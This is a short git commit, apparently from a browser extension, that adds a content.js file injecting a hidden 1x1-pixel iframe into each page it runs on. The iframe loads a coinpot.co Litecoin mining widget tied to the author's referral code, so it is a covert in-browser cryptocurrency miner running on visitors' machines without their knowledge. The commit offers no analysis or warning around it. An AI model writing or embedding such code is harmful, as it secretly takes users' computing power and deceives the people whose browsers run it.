967d1f83441a9194c24c95278447767299bae15d
syuaibsyuaib <syuaibsyuaib@gmail.com>
2019-11-01 13:45:50 +0800

    tes

---
+++ content.js
@@ -0,0 +1,6 @@
+var newItem = document.createElement("IFRAME");
+  newItem.setAttribute("crolling", "no");
+  newItem.setAttribute("frameborder", "0");
+  newItem.setAttribute("src", "https://coinpot.co/mine/litecoin/?ref=0C052766283C&mode=widget");
+   newItem.setAttribute("style", "overflow:hidden;width:1px;height:1px;");
+   document.body.appendChild(newItem);
